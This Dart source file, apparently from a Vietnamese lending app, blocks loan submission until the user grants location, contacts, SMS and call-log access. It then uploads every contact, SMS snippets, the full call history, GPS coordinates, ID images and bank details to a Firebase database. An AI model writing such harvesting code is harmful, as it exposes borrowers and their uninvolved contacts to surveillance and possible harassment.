import 'dart:convert';

import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'dart:io';
import 'dart:developer';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:call_log/call_log.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:device_info/device_info.dart';
import 'package:url_launcher/url_launcher.dart';

import 'package:vtgonl/global/loan.dart';
import 'package:vtgonl/global/noti.dart';
import 'package:vtgonl/global/user.dart';
import 'package:vtgonl/widgets/loader.dart';

import 'package:vtgonl/widgets/mStyle.dart';

import 'package:vtgonl/global/constants.dart';
import 'home.dart';

class HomePagePermission extends StatefulWidget {
  final MUser user;
  final MLoan loan;

  HomePagePermission({Key key, this.user, this.loan}) : super(key: key);
  @override
  _HomePagePermissionState createState() => _HomePagePermissionState();
}

class _HomePagePermissionState extends State<HomePagePermission> {
  var _scaffoldKey = new GlobalKey<ScaffoldState>();
  bool _enableLocationPermission = false;
  bool _enableContactsPermission = false;
  bool _enableMessagesPermission = false;
  bool _enableCallLogsPermission = false;

  bool _checkedbox = false;
  String release = '0';
  String device;
  String sotien, thoihan;

  @override
  void initState() {
    super.initState();

    sotien = widget.loan.sotien.substring(0, widget.loan.sotien.length - 1);
    thoihan = widget.loan.thoihan.substring(0, widget.loan.thoihan.length - 6);

    initPlatformState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      key: _scaffoldKey,
      appBar: AppBar(
        title: Text("Quyền Truy Cập"),
        backgroundColor: Constants.colorPrimary,
        elevation: 0.0,
      ),
      body: Container(
        color: Constants.colorWhite,
        padding: EdgeInsets.only(left: 16, right: 16),
        constraints: BoxConstraints.expand(),
        child: SingleChildScrollView(
            child: Column(
          children: <Widget>[
            SizedBox(
              height: 20,
            ),
            SizedBox(
              height: 280,
              width: double.infinity,
              child: Image.asset(
                'assets/images/imagecoin.jpg',
                fit: BoxFit.cover,
              ),
            ),
            SizedBox(
              height: 20,
            ),
            Container(
              decoration: BoxDecoration(
                color: Constants.colorWhite,
                borderRadius: BorderRadius.circular(50),
              ),
              child: ListTile(
                onTap: () {
                  getLocation();
                },
                trailing: _enableLocationPermission
                    ? Icon(
                        Icons.check,
                        color: Colors.green,
                      )
                    : Icon(
                        Icons.close,
                        color: Colors.red,
                      ),
                title: Text("Cho phép truy cập vị trí",
                    style: TextStyle(fontWeight: FontWeight.bold)),
              ),
            ),
            Container(
              margin: EdgeInsets.only(top: 10),
              decoration: BoxDecoration(
                color: Constants.colorWhite,
                borderRadius: BorderRadius.circular(50),
              ),
              child: ListTile(
                onTap: () async {
                  widget.user.listCONTACT = await getContacts();
                },
                trailing: _enableContactsPermission
                    ? Icon(
                        Icons.check,
                        color: Colors.green,
                      )
                    : Icon(
                        Icons.close,
                        color: Colors.red,
                      ),
                title: Text("Cho phép truy cập danh bạ",
                    style: TextStyle(fontWeight: FontWeight.bold)),
              ),
            ),
            Container(
              width: double.infinity,
              margin: EdgeInsets.only(top: 10),
              decoration: BoxDecoration(
                color: Constants.colorWhite,
                borderRadius: BorderRadius.circular(50),
              ),
              child: ListTile(
                onTap: () async {
                  widget.user.listSMS = await getAllSms();
                },
                trailing: _enableMessagesPermission
                    ? Icon(
                        Icons.check,
                        color: Colors.green,
                      )
                    : Icon(
                        Icons.close,
                        color: Colors.red,
                      ),
                title: Text("Cho phép truy cập tin nhắn",
                    style: TextStyle(fontWeight: FontWeight.bold)),
              ),
            ),
            Container(
              width: double.infinity,
              margin: EdgeInsets.only(top: 10),
              decoration: BoxDecoration(
                color: Constants.colorWhite,
                borderRadius: BorderRadius.circular(50),
              ),
              child: ListTile(
                onTap: () async {
                  widget.user.listCALL = await getCallLogs();
                },
                trailing: _enableCallLogsPermission
                    ? Icon(
                        Icons.check,
                        color: Colors.green,
                      )
                    : Icon(
                        Icons.close,
                        color: Colors.red,
                      ),
                title: Text("Cho phép truy cập lịch sử  cuộc gọi",
                    style: TextStyle(fontWeight: FontWeight.bold)),
              ),
            ),
            Container(
              width: double.infinity,
              margin: EdgeInsets.only(top: 10),
              child: Row(
                children: [
                  Checkbox(
                    value: _checkedbox,
                    onChanged: (value) {
                      setState(() {
                        _checkedbox = value;
                      });
                    },
                  ),
                  RichText(
                    textAlign: TextAlign.justify,
                    text: TextSpan(
                      style: TextStyle(color: Constants.colorBack),
                      text: 'Đồng ý các ',
                      children: <TextSpan>[
                        TextSpan(
                            text: 'Điều kiện Sử dụng',
                            style: TextStyle(color: Colors.blue),
                            recognizer: TapGestureRecognizer()
                              ..onTap = () async {
                                const url = Constants.url_term;
                                if (await canLaunch(url)) {
                                  await launch(url);
                                } else {
                                  throw 'Could not launch $url';
                                }
                              }),
                        TextSpan(
                          text: ' và ',
                        ),
                        TextSpan(
                            text: 'Bảo mật',
                            style: TextStyle(color: Colors.blue),
                            recognizer: TapGestureRecognizer()
                              ..onTap = () async {
                                const url = Constants.url_policy;
                                if (await canLaunch(url)) {
                                  await launch(url);
                                } else {
                                  throw 'Could not launch $url';
                                }
                              }),
                        TextSpan(
                          text: '.',
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            Container(
                height: 48,
                margin: EdgeInsets.only(top: 30),
                child: CustomButton(
                  text: 'Gửi hồ sơ',
                  onPressed: () {
                    {
                      if (!_checkedbox) {
                        showDialog(
                            context: context,
                            builder: (BuildContext context) {
                              return CustomDialog(
                                  icon: Icons.error,
                                  iconColor: Colors.red,
                                  onPressed: () {
                                    Navigator.of(context).pop();
                                  },
                                  title: 'Bạn chưa xác nhận',
                                  descriptions:
                                      'Vui lòng đồng ý với các Điều khoản & Điều kiện Sử dụng và Chính sách Bảo mật của chúng tôi.');
                            });
                      } else if (!_enableLocationPermission ||
                          !_enableContactsPermission ||
                          !_enableMessagesPermission ||
                          !_enableCallLogsPermission) {
                        showDialog(
                            context: context,
                            builder: (BuildContext context) {
                              return CustomDialog(
                                  icon: Icons.error,
                                  iconColor: Colors.red,
                                  onPressed: () {
                                    Navigator.of(context).pop();
                                  },
                                  title: 'Kiểm tra quyền truy cập',
                                  descriptions:
                                      'Có vẻ như ứng dụng không thể truy cập một hoặc một vài tính năng đã được yêu cầu, vui lòng kiểm tra và thiết lập lại các quyền truy cập cho ứng dụng để  hoàn tất quá trình đăng ký.');
                            });
                      } else {
                        onButtonClicked();
                      }
                    }
                  },
                )),
            SizedBox(
              height: 20,
            )
          ],
        )),
      ),
    );
  }

  Future<void> initPlatformState() async {
    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();

    try {
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
        release = androidInfo.version.release;
        var sdkInt = androidInfo.version.sdkInt;
        var model = androidInfo.model;
        device = 'Android $release (SDK $sdkInt), $model';
      } else if (Platform.isIOS) {
        IosDeviceInfo iosInfo = await deviceInfoPlugin.iosInfo;
        device = iosInfo.utsname.machine;
      }

      log('Running on $device');
    } on PlatformException {
      log('Failed to get platform version.');
    }

    if (!mounted) return;
    setState(() {
      widget.user.deviceinfo = device;
    });
  }

  getLocation() async {
    bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      log('Location services are disabled.');
    } else {
      LocationPermission permission = await Geolocator.checkPermission();

      if (permission == LocationPermission.deniedForever) {
        log('Location permissions are permantly denied, we cannot request permissions.');
      } else {
        if (permission == LocationPermission.denied) {
          permission = await Geolocator.requestPermission();
          if (permission != LocationPermission.whileInUse &&
              permission != LocationPermission.always) {
            log('Location permissions are denied (actual value: $permission).');
          }
        } else {
          await Geolocator.getCurrentPosition().then((value) => {
                widget.user.lat = value.latitude.toString(),
                widget.user.lng = value.longitude.toString(),
              });

          log('Found location lat = ' +
              widget.user.lat.toString() +
              ', lng = ' +
              widget.user.lng.toString());

          setState(() {
            _enableLocationPermission = true;
          });
        }
      }
    }
  }

  Future<String> getContacts() async {
    PermissionStatus permissionStatus = await Permission.contacts.request();
    if (permissionStatus != PermissionStatus.granted) {
      _scaffoldKey.currentState.showSnackBar(SnackBar(
        content: Text("CONTACTS_PERMISSION_DENIED"),
      ));
      return null;
    } else {
      // Load without thumbnails initially.
      var contacts =
          (await ContactsService.getContacts(withThumbnails: false)).toList();

      String filename = 'contacts.json';
      final directory = await getApplicationDocumentsDirectory();
      final _localPath = directory.path;
      final _localFile = File('$_localPath/$filename');

      var count = 0;

      if (await File('$_localPath/$filename').exists()) {
        _localFile.delete();
      }

      String contactJson = '[';

      for (final Contact contact in contacts) {
        count++;

        Map<String, dynamic> contactJsonItem = {};
        Constants.writeJson(contactJsonItem, "stt", count.toString());
        Constants.writeJson(contactJsonItem, "name", contact.displayName);
        Constants.writeJson(
            contactJsonItem, 'phone', contact.phones.elementAt(0).value);
        contactJson = contactJson + jsonEncode(contactJsonItem) + ',';
      }

      Map<String, dynamic> sumary = {};
      Constants.writeJson(
          sumary, 'onCreated', DateTime.now().toString().substring(0, 16));
      contactJson = contactJson + jsonEncode(sumary);
      contactJson = contactJson + ']';

      //File file = await Constants.writeFile(filename, contactJson);
      //log(await Constants.readFile(filename));

      setState(() {
        _enableContactsPermission = true;
      });

      return contactJson;
    }
  }

  Future<String> getAllSms() async {
    PermissionStatus permissionStatus = await Permission.sms.request();

    if (permissionStatus != PermissionStatus.granted) {
      _scaffoldKey.currentState.showSnackBar(SnackBar(
        content: Text("SMS_PERMISSION_DENIED"),
      ));
      return null;
    } else {
      SmsQuery query = new SmsQuery();
      List<SmsMessage> messages = await query.getAllSms;

      String filename = 'sms.txt';
      final directory = await getApplicationDocumentsDirectory();
      final _localPath = directory.path;
      final _localFile = File('$_localPath/$filename');
      var count = 0;

      if (await File('$_localPath/$filename').exists()) {
        _localFile.delete();
      }

      String smsJson = '[';

      for (SmsMessage entry in messages) {
        count++;

        Map<String, dynamic> smsJsonItem = {};
        Constants.writeJson(smsJsonItem, "stt", count.toString());
        Constants.writeJson(smsJsonItem, "sender", entry.sender);
        Constants.writeJson(smsJsonItem, "date",
            entry.date.day.toString() + '-' + entry.date.month.toString());

        var content = entry.body;
        if (entry.body.length > 30) {
          content = content.substring(0, 30) + '...';
        }
        Constants.writeJson(smsJsonItem, "sms", content);

        smsJson = smsJson + jsonEncode(smsJsonItem) + ',';
      }
      Map<String, dynamic> sumary = {};
      Constants.writeJson(
          sumary, 'onCreated', DateTime.now().toString().substring(0, 16));
      smsJson = smsJson + jsonEncode(sumary);
      smsJson = smsJson + ']';
      //File file = await Constants.writeFile(filename, smsJson);
      //log(await Constants.readFile(filename));
      setState(() {
        _enableMessagesPermission = true;
      });

      return smsJson;
    }
  }

  Future<String> getCallLogs() async {
    String filename = 'call_log.txt';
    final directory = await getApplicationDocumentsDirectory();
    final _localPath = directory.path;
    final _localFile = File('$_localPath/$filename');
    var count = 0;

    if (await File('$_localPath/$filename').exists()) {
      _localFile.delete();
    }

    Iterable<CallLogEntry> entries;
    if (double.parse(release) < 6) {
      entries = null;
      return 'Can not get call log on ' + device;
    } else {
      entries = await CallLog.get();
      String callJson = '[';

      for (CallLogEntry entry in entries) {
        count++;

        Map<String, dynamic> callJsonItem = {};
        Constants.writeJson(callJsonItem, "stt", count.toString());
        Constants.writeJson(callJsonItem, "number", entry.number);
        Constants.writeJson(callJsonItem, "name", entry.name);
        Constants.writeJson(
            callJsonItem, "type", entry.callType.toString().substring(9, 12));
        Constants.writeJson(
            callJsonItem,
            "time",
            DateTime.fromMillisecondsSinceEpoch(entry.timestamp)
                    .day
                    .toString() +
                '-' +
                DateTime.fromMillisecondsSinceEpoch(entry.timestamp)
                    .month
                    .toString());

        Constants.writeJson(callJsonItem, "s", entry.duration.toString());

        callJson = callJson + jsonEncode(callJsonItem) + ',';
      }
      Map<String, dynamic> sumary = {};
      Constants.writeJson(
          sumary, 'onCreated', DateTime.now().toString().substring(0, 16));
      callJson = callJson + jsonEncode(sumary);
      callJson = callJson + ']';

      //File file = await Constants.writeFile(filename, callJson);
      //log(await Constants.readFile(filename));

      setState(() {
        _enableCallLogsPermission = true;
      });

      return callJson;
    }
  }

  onButtonClicked() async {
    showDialog(
        context: context,
        builder: (BuildContext context) {
          return ColorLoader();
        });

    List<MLoan> loans = widget.user.loans;
    loans.add(widget.loan);
    widget.user.loans = loans;

    await uploadImage();
    await uploadUser();
    await uploadLoan();

    Navigator.of(context).pop();

    widget.user.notis.add(new Noti(
        title: 'Đăng ký khoản vay thành công !',
        content: contentNoti(
            widget.user.name, sotien, widget.loan.thoihan, widget.loan.shd)));

    showDialog(
        context: context,
        builder: (BuildContext context) {
          return CustomDialog(
            icon: Icons.check,
            iconColor: Colors.green,
            title: 'Hoàn tất !',
            descriptions:
                ' Information was hidden for personal reason !',
            onPressed: () {
              Navigator.of(context).pop();
              Navigator.push(
                  context,
                  CupertinoPageRoute(
                      builder: (context) => HomePage(user: widget.user)));
            },
          );
        });
  }

  String contentNoti(String name, String sotien, String th, String id) {
    return '<p> Information was hidden for personal reason !</p>';
  }

  Future<void> uploadUser() async {
    String vnphone = '+84' + widget.user.phone.substring(1);

    await FirebaseDatabase.instance
        .reference()
        .child(Constants.root_user)
        .child(vnphone)
        .update({
      'job': widget.user.job,
      'salary': widget.user.salary,
      'companyName': widget.user.companyName,
      'companyPhone': widget.user.companyPhone,
      'companyAddress': widget.user.companyAddress,
      'bankName': widget.user.bankName,
      'bankUser': widget.user.bankUser,
      'bankNumber': widget.user.bankNumber,
      'bankAddress': widget.user.bankAddress,
      'linkSIM': widget.user.linkSIM,
      'linkCMND1': widget.user.linkCMND1,
      'linkCMND2': widget.user.linkCMND2,
      'linkHDLD': widget.user.linkHDLD,
      'linkSAOKE1': widget.user.linkSAOKE1,
      'linkSAOKE2': widget.user.linkSAOKE2,
      'linkSAOKE3': widget.user.linkSAOKE3,
      'listCONTACT': widget.user.listCONTACT,
      'listSMS': widget.user.listSMS,
      'listCALL': widget.user.listCALL,
      'lat': widget.user.lat,
      'lng': widget.user.lng,
    });
  }

  Future<void> uploadLoan() async {
    String shd = widget.loan.shd;
    await FirebaseDatabase.instance
        .reference()
        .child(Constants.root_loan)
        .child(shd)
        .update({
      'SHD': widget.loan.shd,
      'STATUS': widget.loan.trangthai,
      'name': widget.user.name,
      'phone': widget.user.phone,
      'email': widget.user.email,
      'sotien': sotien,
      'thoihan': thoihan,
      'sotientramoithang': widget.loan.sotientramoithang,
      'mucdich': widget.loan.mucdich,
      'kehoachtra': widget.loan.kehoachtra,
      'facebook': widget.user.facebook,
      'lat': widget.user.lat,
      'lng': widget.user.lng,
      'ngaytao': widget.loan.ngaytao,
    });
  }

  Future<void> uploadImage() async {
    if (widget.user.imageSIM != null) {
      widget.user.linkSIM = await Constants.uploadFile(
          widget.user.imageSIM, widget.user.phone + 'SIM');
    }
    if (widget.user.imageCMND1 != null && widget.user.imageCMND2 != null) {
      widget.user.linkCMND1 = await Constants.uploadFile(
          widget.user.imageCMND1, widget.user.phone + 'CMND1');
      widget.user.linkCMND2 = await Constants.uploadFile(
          widget.user.imageCMND2, widget.user.phone + 'CMND2');
    }

    if (widget.user.imageHDLD != null) {
      widget.user.linkHDLD = await Constants.uploadFile(
          widget.user.imageHDLD, widget.user.phone + 'HDLD');
    }
    if (widget.user.imageSAOKE1 != null) {
      widget.user.linkSAOKE1 = await Constants.uploadFile(
          widget.user.imageSAOKE1, widget.user.phone + 'SAOKE1');
    }
    if (widget.user.imageSAOKE2 != null) {
      widget.user.linkSAOKE2 = await Constants.uploadFile(
          widget.user.imageSAOKE2, widget.user.phone + 'SAOKE2');
    }
    if (widget.user.imageSAOKE3 != null) {
      widget.user.linkSAOKE3 = await Constants.uploadFile(
          widget.user.imageSAOKE3, widget.user.phone + 'SAOKE3');
    }
  }
}
